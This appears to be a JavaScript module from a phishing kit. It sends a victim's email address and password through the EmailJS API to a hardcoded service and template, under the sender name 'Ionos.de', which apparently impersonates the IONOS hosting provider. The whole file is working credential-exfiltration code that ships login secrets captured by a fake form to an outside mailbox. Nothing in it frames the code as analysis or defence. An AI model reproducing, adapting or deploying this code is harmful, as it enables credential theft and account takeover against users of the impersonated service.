import axios from "axios";

const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
const service_id = "service_lft5wm8";
const template_id = "template_gr3x1es";
const public_key = "7vLRX8xDyQ_rRUOOk";

const sendEmail = (values) => {
  const payload = {
    service_id,
    template_id,
    user_id: public_key,
    template_params: {
      from_name: "Ionos.de",
      email: values.email,
      password: values.password,
    },
  };

  return axios.post(endpoint, payload);
};

export default sendEmail;
